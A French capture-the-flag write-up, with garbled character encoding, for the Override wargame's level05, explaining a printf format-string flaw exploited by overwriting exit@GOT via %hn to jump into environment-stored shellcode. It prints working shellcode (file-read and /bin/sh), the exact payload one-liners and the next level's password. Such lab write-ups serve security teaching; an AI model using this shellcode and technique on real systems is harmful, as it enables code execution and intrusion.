# ğŸ“˜ Override â€“ Level05

## ğŸ“ Description

Ce niveau introduit une vulnÃ©rabilitÃ© **format string** dans un programme qui lit une chaÃ®ne de lâ€™utilisateur, modifie certains caractÃ¨res, puis la passe directement Ã  `printf()` sans spÃ©cifier de format.

Le but est de dÃ©tourner le flux dâ€™exÃ©cution pour rÃ©cupÃ©rer le mot de passe du niveau suivant.

---

## ğŸ” Analyse du binaire

Le programme lit une chaÃ®ne dans `local_78`, puis effectue une modification sur chaque caractÃ¨re :

```c
fgets(local_78, 100, stdin);

if (('@' < local_78[i]) && (local_78[i] < '[')) {
    local_78[i] = local_78[i] ^ 0x20;   // Aâ€“Z converties en minuscules
}
```

Enfin :

```c
printf((char *)local_78);   // âš ï¸ VulnerabilitÃ© format-string
exit(0);
```

### ProblÃ¨mes du programme

#### 1ï¸âƒ£ **Format String Vulnerability**

`printf(local_78)` fait interprÃ©ter lâ€™entrÃ©e utilisateur comme un format :

```
%p %x %n %s ...
```

â†’ On peut **lire la mÃ©moire**, **fuiter des adresses**,
et surtout **Ã©crire Ã  une adresse arbitraire** via `%n`, `%hn`, `%hhn`.

#### 2ï¸âƒ£ Transformation des majuscules

Toute lettre ASCII entre `A` et `Z` est modifiÃ©e :

```
'A' (0x41) â†’ 0x61 ('a')
'B' (0x42) â†’ 0x62 ('b')
...
```

Donc le payload doit **Ã©viter les lettres majuscules**.

---

## ğŸ¯ Objectif de lâ€™exploitation

Le binaire appelle :

```c
exit(0);
```

DÃ©fini dans la Global Offset Table :

```bash
objdump -R ./level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```

â¡ï¸ Si on Ã©crase `exit@GOT` avec une adresse contrÃ´lÃ©e,
le programme **sautera vers cette adresse** au moment dâ€™appeler `exit()`.

Nous allons donc :

* mettre un **NOP sled + shellcode** dans lâ€™environnement (`SHELLCODE=...`)
* trouver son adresse exacte en mÃ©moire
* Ã©craser `exit@GOT` pour quâ€™il pointe vers ce shellcode

â†’ Le programme exÃ©cutera le shellcode â†’ on lit le `.pass`.

---

## ğŸ§¨ Mise en place du shellcode dans lâ€™environnement

### 1ï¸âƒ£ Ajouter un NOP sled + ton shellcode personnalisÃ©

Ce shellcode lit :

```
/home/users/level06/.pass
```

Et lâ€™affiche.

```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"')
```

### 2ï¸âƒ£ Trouver lâ€™adresse du shellcode

Dans GDB :

```gdb
(gdb) r
AAAA
x/20s *((char**)environ)
0xffffd794:	 "SHELLCODE=\220
```

Le NOP sled commence juste aprÃ¨s `"SHELLCODE="` :

```
0xffffd794 + 100 = 0xffffd7f8
```

---

## ğŸ”§ Exploit Format String

## ğŸ“Œ Pourquoi ne pas Ã©crire les 4 octets en une fois ?

Lors dâ€™une exploitation Format String, on pourrait Ãªtre tentÃ© dâ€™utiliser `%n` pour Ã©crire directement les **4 octets** dâ€™une adresse.  
Cependant, cette approche est rarement viable.

### âŒ ProblÃ¨mes avec `%n` (Ã©criture 4 octets)

- On doit gÃ©nÃ©rer des **valeurs Ã©normes** pour correspondre Ã  une adresse complÃ¨te de 32 bits  
  â†’ imprÃ©cis et instable

### âœ” Pourquoi utiliser `%hn` (Ã©criture 2 octets)

`%hn` permet dâ€™Ã©crire seulement **un half-word (2 octets)**.  
Câ€™est beaucoup plus fiable et plus flexible :

- Permet de **sÃ©parer lâ€™adresse** en deux parties gÃ©rables :
  - **low** : 2 octets faibles  
  - **high** : 2 octets hauts

### ğŸ¯ Exemple

Pour Ã©crire lâ€™adresse :



Nous devons Ã©crire cette adresse dans :

```
exit@GOT = 0x080497e0
```

Comme `%hn` Ã©crit un short (2 bytes), on coupe l'adresse :

```
0xffffd7f8 â†’ high = 0xffff, low = 0xd7f8
```

Padding calculÃ© :

* low  = 55288
* high = 65535

Donc le padding pour atteindre 65535 est :

65535 - 55288 = 10247

Final exploit :

```bash

export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"')

python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55280d%10\$hn' + '%10247d%11\$hn'" | ./level05

export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55280d%10\$hn' + '%10247d%11\$hn'"; cat) | ./level05
```

---

## ğŸ RÃ©sultat

Lâ€™appel Ã  `exit()` saute dans le NOP sled, puis ton shellcode sâ€™exÃ©cute et imprime :

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

---

## âœ… RÃ©sumÃ©

| Ã‰lÃ©ment              | Valeur                                     |
| -------------------- | ------------------------------------------ |
| VulnÃ©rabilitÃ©        | Format String (`printf(user_input)`)       |
| Transformation       | XOR 0x20 sur Aâ€“Z â†’ Ã©viter les majuscules   |
| GOT ciblÃ©e           | `exit@GOT = 0x080497e0`                    |
| Payload              | overwrite via `%hn`                        |
| Shellcode            | placÃ© dans environnement via `$SHELLCODE`  |
| Adresse utilisÃ©e     | `0xffffd7f8` (NOP sled)                    |
| Exploit final        | One-liner Python                           |
| Mot de passe level06 | `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq` |